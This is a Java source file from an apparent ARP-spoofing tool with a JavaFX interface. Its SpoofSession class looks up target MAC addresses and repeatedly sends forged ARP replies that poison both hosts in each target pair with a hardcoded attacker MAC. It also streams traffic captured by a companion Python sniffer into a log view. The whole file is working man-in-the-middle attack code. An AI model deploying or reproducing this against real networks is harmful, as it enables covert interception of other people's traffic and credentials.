package nl.marcmanning.spoofer;

import javafx.application.Platform;
import javafx.collections.ListChangeListener;
import javafx.collections.ObservableList;
import nl.marcmanning.spoofer.components.LogView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

public class SpoofSession {
    private volatile boolean isRunning;
    private final Map<String, String> macAddresses;
    private final List<TargetEntry> targets;
    private final LogView logView;
    private final BlockingQueue<TargetEntry> targetQueue;
    private final String attackerMac = "32:c9:39:c7:07:22" ;
    private final long refreshTime;

    private Socket pythonSocket;
    private PrintWriter out;
    private BufferedReader in;

    public SpoofSession(ObservableList<TargetEntry> targetEntries, LogView logView, long refreshTime) {
        this.isRunning = false;
        this.macAddresses = new HashMap<>();
        this.logView = logView;
        targetQueue = new LinkedBlockingQueue<>();
        targets = new ArrayList<>();
        this.refreshTime = refreshTime;

        /* Add everything to the targetQueue to prevent concurrency issues */
        for (TargetEntry entry : targetEntries) {
            try {
                targetQueue.put(entry.copy());
            } catch (InterruptedException e) {
                System.out.println(e.getMessage());
            }
        }
        targetEntries.addListener((ListChangeListener<TargetEntry>) change -> {
            while (change.next()) {
                if (change.wasAdded()) {
                    for (TargetEntry entry : change.getAddedSubList()) {
                        try {
                            targetQueue.put(entry.copy());
                        } catch (InterruptedException e) {
                            System.out.println(e.getMessage());
                        }
                    }
                }
            }
        });

        try {
            Scapy.sniff();
            Thread.sleep(1000);
            pythonSocket = new Socket("localhost", 9999);
            out = new PrintWriter(pythonSocket.getOutputStream());
            in = new BufferedReader(new InputStreamReader(pythonSocket.getInputStream()));
        } catch (IOException e) {
            logView.logError("Failed to connect to python sniffer: " + e.getMessage());
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public void stop() {
        isRunning = false;

        try {
            if (out != null) {
                out.println("{\"action\": \"shutdown\"}");
                out.flush();
            }
            if (in != null) in.close();
            if (out != null) out.close();
            if (pythonSocket != null) pythonSocket.close();

            Scapy.stopSniffing();
        } catch (IOException e) {
            logView.logError("Error during shutdown: " + e.getMessage());
        }

        logView.logInfo("Stopped spoofing");
    }

    /* Run this method in another thread then the JavaFX main thread */
    public void start() {
        isRunning = true;
        if (in == null || out == null) {
            logView.logError("In or out is null");
        } else {
            Thread thread1 = new Thread(this::run);
            Thread thread2 = new Thread(this::runPacketReader);
            thread1.setDaemon(true);
            thread2.setDaemon(true);
            thread1.start();
            thread2.start();
        }
    }

    private void run() {
        long time = System.nanoTime();
        while (isRunning) {

            /* Find the mac addresses of the newly incoming target entries (when a user
               adds a target while in a session) */
            TargetEntry entry;
            while ((entry = targetQueue.poll()) != null) {
                putMacAddressesWhenMissing(entry);
                if (macAddresses.containsKey(entry.getIp1()) && macAddresses.containsKey(entry.getIp2())) {
                    targets.add(entry);
                }
            }

            if (System.nanoTime() - time >= refreshTime) {
                for (TargetEntry target : targets) {
                    Scapy.sendArpReply(target.getIp1(), macAddresses.get(target.getIp1()), target.getIp2(), attackerMac);
                    Scapy.sendArpReply(target.getIp2(), macAddresses.get(target.getIp2()), target.getIp1(), attackerMac);
                }
                time = time + refreshTime;
            }
        }
    }

    private void runPacketReader() {
        String line;
        try {
            while ((line = in.readLine()) != null) {
                String finalLine = line;
                Platform.runLater(() -> logView.logInfo(finalLine));
            }
        } catch (IOException e) {
            Platform.runLater(() ->
                    logView.logError("Python sniffer connection lost: " + e.getMessage()));
        }
    }

    private void putMacAddressesWhenMissing(TargetEntry entry) {
        boolean result1 = putMacAddressesWhenMissing(entry.getIp1());
        boolean result2 = putMacAddressesWhenMissing(entry.getIp2());
        if (result1 && result2) {
            out.println("{\"action\": \"add_pair\", \"ip1\": \"" + entry.getIp1() + "\", \"ip2\": \"" + entry.getIp2() + "\"}");
            out.flush();
        }
    }

    private boolean putMacAddressesWhenMissing(String ip) {
        if (!macAddresses.containsKey(ip)) {
            String macAddress = Scapy.getMacAddress(ip);
            if (!macAddress.equals("None")) {
                macAddresses.put(ip, macAddress);
                logView.logInfo(ip + " --> " + macAddress);
                return true;
            } else {
                logView.logError(ip + " --> NONE");
                return false;
            }
        }
        return true;
    }
}
